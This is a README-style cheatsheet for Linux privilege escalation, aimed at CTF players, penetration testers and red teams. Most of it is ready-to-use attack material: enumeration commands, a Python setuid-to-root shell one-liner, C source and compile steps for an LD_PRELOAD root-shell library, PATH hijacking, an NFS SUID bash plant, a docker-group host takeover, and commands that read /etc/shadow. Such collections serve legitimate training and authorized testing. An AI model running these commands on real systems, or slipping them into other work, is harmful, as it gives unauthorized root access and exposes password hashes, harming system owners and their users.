# linux-privilege-escalation-cheatsheet
This is a practical cheatsheet for Linux Privilege Escalation, ordered by priority.  
It is intended for Capture The Flag (CTF) exercises, penetration testing, and red team operations.  
Each section includes examples and ready-to-use commands.

General Info & Enumeration
Always perform this first: identify running processes, open ports, users, and interesting files to find escalation opportunities.

Essential commands:  
whoami  
id  
hostname  
uname -a  
ps aux  
netstat -tulnp  
ss -tulnp  
env  
find / -name "*.log" 2>/dev/null  
find / -writable -type d 2>/dev/null  
cat /etc/crontab  
ls -la /etc/cron.*  
ls -la /var/spool/cron  
ls -la /home  
ls -la /tmp  
sudo -l  

--------------------------------------------------------------------------------------

# **SUDO**
Allows executing commands with elevated privileges if permitted in the sudoers file.  

sudo -l  
If a binary is listed, search it on GTFOBins.

--------------------------------------------------------------------------------------

# **SUID (Set User ID)**
Binaries that run with root privileges even when executed by unprivileged users.  

find / -perm -4000 -type f 2>/dev/null  
find / -perm /4000 2>/dev/null  
Check each binary on GTFOBins for known exploits.  

--------------------------------------------------------------------------------------

# **Capabilities**
Check if regular binaries have special capabilities like cap_setuid, which allow privilege escalation.  

getcap -r / 2>/dev/null  

If cap_setuid+ep is found on binaries like Python:  
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")' 

--------------------------------------------------------------------------------------

# **LD_PRELOAD / LD_LIBRARY_PATH**
Advanced technique using environment variables and sudo to run arbitrary code.  

Check if LD_PRELOAD is allowed:  
sudo -l

Create this C code:  
#include <stdio.h>  
#include <stdlib.h>  
#include <unistd.h>  
  
void _init() {  
   unsetenv("LD_PRELOAD");  
   setgid(0);  
   setuid(0);  
   system("/bin/bash");  
}  

Compile it:  
gcc -fPIC -shared -o /tmp/lib.so shell.c -nostartfiles  

Execute an allowed command:  
sudo LD_PRELOAD=/tmp/lib.so <command>  

Example:  
sudo LD_PRELOAD=/tmp/lib.so find  

--------------------------------------------------------------------------------------

# **Cron Jobs**  
Scheduled scripts executed by root. If editable, they are exploitable.  

cat /etc/crontab  
ls -la /etc/cron.*  
ls -la /var/spool/cron  
  
Check if any scheduled scripts are writable or vulnerable to PATH hijacking.  

--------------------------------------------------------------------------------------

# **Weak File Permissions**
Critical files like /etc/shadow or /etc/passwd with unsafe permissions may allow hash reading or user modification.
  
find / -writable -type f -user root 2>/dev/null  
cat /etc/shadow  
cat /etc/passwd  

--------------------------------------------------------------------------------------

# **PATH Hijacking**  
If a script executed by root uses commands without absolute paths, you can hijack the PATH to run your own version.  
  
echo "/bin/bash" > cp  
chmod +x cp  
export PATH=.:$PATH  
./script.sh  

--------------------------------------------------------------------------------------

# **NFS Misconfiguration**  
If an NFS share is mounted with no_root_squash, you can upload SUID binaries and execute them remotely.  
  
showmount -e <IP>  
mount -t nfs <IP>:/home/backup /mnt/backup  
cp /bin/bash /mnt/backup/rootbash  
chmod +s /mnt/backup/rootbash  
  
--------------------------------------------------------------------------------------
   
# **Docker Misconfiguration**  
If the user is in the docker group, they can access the host by running privileged containers.  
  
id  # Check if you're in the docker group  
docker run -v /:/mnt --rm -it alpine chroot /mnt sh  
  
--------------------------------------------------------------------------------------

# **Kernel Exploits**  
Last resort. Use known exploits against vulnerable kernels (e.g., Dirty COW, OverlayFS).  
  
uname -a  
searchsploit linux kernel  



This cheatsheet was created for learning and practice purposes during Linux privilege escalation exercises.    
Feel free to fork, improve, and share it with the community.  


Made by [hawaiiansnow11mdm](https://github.com/hawaiiansnow11mdm)





